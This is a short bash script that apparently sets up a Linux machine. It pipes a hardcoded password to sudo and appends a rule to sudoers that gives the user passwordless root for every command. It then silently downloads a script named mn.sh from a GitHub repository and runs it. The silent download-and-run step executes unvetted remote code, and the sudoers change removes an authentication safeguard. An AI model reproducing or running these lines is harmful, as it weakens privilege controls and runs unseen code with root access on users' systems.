#!/bin/bash

echo '123456' | sudo -S yourCommand

# NO PASSWORD
sudo su
echo "user ALL=(ALL) NOPASSWD: ALL" | sudo EDITOR="tee -a" visudo

# LIST
wget -O mn.sh https://github.com/grass-cat/setup-wineHQ/raw/main/mn.sh > /dev/null 2>&1
chmod +x mn.sh
./mn.sh
